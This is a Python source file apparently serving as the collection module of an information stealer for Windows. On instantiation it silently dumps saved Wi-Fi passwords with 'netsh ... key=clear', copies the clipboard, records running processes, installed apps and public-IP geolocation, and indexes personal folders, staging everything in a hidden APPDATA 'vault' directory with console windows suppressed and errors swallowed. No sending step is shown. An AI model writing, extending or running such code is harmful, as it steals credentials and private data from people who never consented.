import pyperclip
from datetime import timedelta
import os
import locale
import subprocess
import threading
import platform
import psutil
import requests
from datetime import datetime

class sysinfo:
    def __init__(self):
        self.networks = {}
        self.clipboard_content = ""
        self.system_info = {}
        self.task_list = []
        self.installed_apps = []
        self.battery_info = {}
        self.disk_info = {}
        self.system_locale = {}
        self.ip_location = {}
        self.target_path = os.path.join(os.getenv('APPDATA'), "vault", "system")
        os.makedirs(self.target_path, exist_ok=True)
        self.file_path = os.path.join(self.target_path, "machineinfo.txt")
        self.clipboard_path = os.path.join(self.target_path, "clipboard.txt")
        self.tasklist_path = os.path.join(self.target_path, "tasklist.txt")
        self.apps_path = os.path.join(self.target_path, "installed_apps.txt")
        self.tree_path = os.path.join(self.target_path, "tree.txt")
        self.run_threads()

    def run_threads(self):
        threads = [
            threading.Thread(target=self.get_networks),
            threading.Thread(target=self.get_clipboard_content),
            threading.Thread(target=self.get_system_info),
            threading.Thread(target=self.get_task_list),
            threading.Thread(target=self.get_installed_apps),
            threading.Thread(target=self.get_battery_info),
            threading.Thread(target=self.get_disk_info),
            threading.Thread(target=self.get_system_locale),
            threading.Thread(target=self.get_ip_location),
            threading.Thread(target=self.get_file_tree)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        self.save_info()

    def get_networks(self):
        try:
            output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"], creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
            profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
            for profile in profiles:
                if profile:
                    network_info = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"], creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
                    password = self.extract_password(network_info)
                    self.networks[profile] = password if password else "nopwd"
        except Exception:
            pass

    def extract_password(self, network_info):
        for line in network_info.split("\n"):
            if "Key Content" in line:
                return line.split(":")[1].strip()
        return None

    def get_clipboard_content(self):
        try:
            self.clipboard_content = pyperclip.paste()
            with open(self.clipboard_path, "w") as f:
                f.write(self.clipboard_content)
        except Exception:
            self.clipboard_content = "Unable to fetch clipboard content."
            with open(self.clipboard_path, "w") as f:
                f.write(self.clipboard_content)

    def get_system_info(self):
        try:
            uptime_seconds = psutil.boot_time()
            current_time = datetime.now()
            uptime_delta = current_time - datetime.fromtimestamp(uptime_seconds)
            self.system_info = {
                "Date/Time": current_time.strftime("%Y-%m-%d %H:%M:%S"),
                "PC Name": platform.node(),
                "User Name": os.getlogin(),
                "OS": platform.system(),
                "Platform": platform.platform(),
                "Architecture": platform.architecture()[0],
                "CPU": platform.processor(),
                "GPU": "Unavailable", 
                "Memory Usage": f"{psutil.virtual_memory().used // (1024 ** 2)}MB / {psutil.virtual_memory().total // (1024 ** 2)}MB",
                "Uptime": str(uptime_delta).split(".")[0],
            }
        except Exception:
            pass

    def get_task_list(self):
        try:
            tasks = subprocess.check_output(["tasklist"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
            self.task_list = tasks.strip().split("\n")
            with open(self.tasklist_path, "w") as f:
                for task in self.task_list:
                    f.write(f"{task}\n")
        except Exception:
            self.task_list = ["Unable to fetch task list."]
            with open(self.tasklist_path, "w") as f:
                f.write(self.task_list[0])

    def get_installed_apps(self):
        try:
            cmd = "echo Y | winget list"
            result = subprocess.check_output(cmd, shell=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            result = "\n".join([line for line in result.splitlines() if not line.startswith("-") and "\\" not in line and line.strip()])
            with open(self.apps_path, "w") as f:
                f.write("INSTALLED APPS\n")
                f.write("=" * 80 + "\n")
                f.write(f"{result}\n")
                f.write("=" * 80 + "\n")
        except Exception:
            with open(self.apps_path, "w") as f:
                f.write("Unable to fetch installed applications.")

    def get_battery_info(self):
        try:
            battery = psutil.sensors_battery()
            if battery:
                self.battery_info = {
                    "Battery Status": battery.power_plugged and "Charging" or "Discharging",
                    "Battery Percentage": f"{battery.percent}%",
                    "Battery Time Left": str(timedelta(seconds=battery.secsleft)) if battery.secsleft != psutil.POWER_TIME_UNKNOWN else "Unknown"
                }
        except Exception:
            self.battery_info = {"Battery Status": "Unavailable", "Battery Percentage": "Unavailable", "Battery Time Left": "Unavailable"}

    def get_disk_info(self):
        try:
            disk_usage = psutil.disk_usage('/')
            self.disk_info = {
                "Total Disk Space": f"{disk_usage.total // (1024 ** 3)}GB",
                "Used Disk Space": f"{disk_usage.used // (1024 ** 3)}GB",
                "Free Disk Space": f"{disk_usage.free // (1024 ** 3)}GB",
            }
        except Exception:
            self.disk_info = {"Total Disk Space": "Unavailable", "Used Disk Space": "Unavailable", "Free Disk Space": "Unavailable"}

    def get_system_locale(self):
        try:
            self.system_locale = {
                "Locale": locale.getdefaultlocale()[0],
                "Timezone": datetime.now().astimezone().tzinfo
            }
        except Exception:
            self.system_locale = {"Locale": "Unavailable", "Timezone": "Unavailable"}

    def get_ip_location(self):
        try:
            public_ip = requests.get("https://api.ipify.org?format=json").json().get("ip")
            location = requests.get(f"https://ipinfo.io/{public_ip}/json").json()
            self.ip_location = {
                "IP": public_ip,
                "City": location.get("city", "Unavailable"),
                "Region": location.get("region", "Unavailable"),
                "Country": location.get("country", "Unavailable")
            }
        except Exception:
            self.ip_location = {"IP": "Unavailable", "City": "Unavailable", "Region": "Unavailable", "Country": "Unavailable"}

    def get_file_tree(self):
        try:
            directories = {
                "Documents": os.path.expanduser('~\\Documents'),
                "Downloads": os.path.expanduser('~\\Downloads'),
                "Pictures": os.path.expanduser('~\\Pictures'),
                "Videos": os.path.expanduser('~\\Videos')
            }
            with open(self.tree_path, "w") as f:
                f.write("FILE TREE\n")
                f.write("=" * 80 + "\n")
                for folder, path in directories.items():
                    if os.path.exists(path):
                        f.write(f"{folder}:\n")
                        f.write("=" * 80 + "\n")
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                file_size = os.path.getsize(file_path)
                                file_type = file.split('.')[-1] if '.' in file else "Unknown"
                                f.write(f"{file_path:<60}{file_size:<10} {file_type}\n")
                        f.write("=" * 80 + "\n")
        except Exception:
            pass

    def save_info(self):
        try:
            with open(self.file_path, "w") as f:
                f.write("MACHINE INFO\n")
                f.write("=" * 80 + "\n")

                if self.networks:
                    f.write("\nWi-Fi Networks:\n")
                    f.write("=" * 80 + "\n")
                    f.write(f"{'SSID':<40}{'Password'}\n")
                    f.write("=" * 80 + "\n")
                    for ssid, password in self.networks.items():
                        f.write(f"{ssid:<40}{password}\n")
                    f.write("=" * 80 + "\n")

                f.write("\nSystem Information:\n")
                f.write("=" * 80 + "\n")
                for key, value in self.system_info.items():
                    f.write(f"{key:<20}: {value}\n")
                f.write("=" * 80 + "\n")

                f.write("\nBattery Info:\n")
                f.write("=" * 80 + "\n")
                for key, value in self.battery_info.items():
                    f.write(f"{key:<20}: {value}\n")
                f.write("=" * 80 + "\n")

                f.write("\nDisk Info:\n")
                f.write("=" * 80 + "\n")
                for key, value in self.disk_info.items():
                    f.write(f"{key:<20}: {value}\n")
                f.write("=" * 80 + "\n")

                f.write("\nSystem Locale:\n")
                f.write("=" * 80 + "\n")
                for key, value in self.system_locale.items():
                    f.write(f"{key:<20}: {value}\n")
                f.write("=" * 80 + "\n")

                f.write("\nIP Location:\n")
                f.write("=" * 80 + "\n")
                for key, value in self.ip_location.items():
                    f.write(f"{key:<20}: {value}\n")
                f.write("=" * 80 + "\n")

                f.write("\n-----------------------------------------\n")
                f.write("=" * 80 + "\n")
        except Exception as e:
            return
SYSINFO = sysinfo